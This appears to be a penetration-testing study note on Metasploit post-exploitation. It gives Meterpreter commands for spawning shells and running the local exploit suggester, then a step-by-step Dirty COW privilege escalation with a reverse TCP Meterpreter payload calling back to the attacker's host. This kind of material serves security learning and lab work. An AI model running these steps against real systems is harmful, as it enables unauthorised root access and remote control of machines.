---
tags: [ "metasploit", "post-exploitation", "privesc", "dirty-cow", "meterpreter" ]
aliases: [ "Local Exploit Suggester", "Root Escalation" ]
created: 2025-12-21
---

# 🔓 Post-Exploitation & Privilege Escalation

> [!info] Workflow Context
> These steps happen **after** you have gained an initial Meterpreter session. The goal is to stabilize the shell or elevate privileges (User -> Root/System).

## 1. Meterpreter Session Management
Basic commands to interact with the compromised system.

- Load plugins (check available extensions)
- Get help for a specific command/plugin
- Spawn a standard system shell from Meterpreter
- Linux:
- Windows:
- Run from inside Meterpreter
- Background the session to run the exploit
- (Session is now saved as ID 1, 2, etc.)
- 1. Select the exploit module
- 2. Link to your existing session
- 3. Configure the payload (Reverse TCP)
- 4. Launch

```bash title:Meterpreter_Commands
load -l

help <command>

execute -f /bin/bash -i

execute -f cmd.exe -i

meterpreter > run post/multi/recon/local_exploit_suggester

meterpreter > background

msf6 > use exploit/linux/local/dirty_cow

msf6 exploit(linux/local/dirty_cow) > set SESSION 1

set payload linux/x86/meterpreter/reverse_tcp
set LHOST <your_ip>
set LPORT <your_port>

run
```
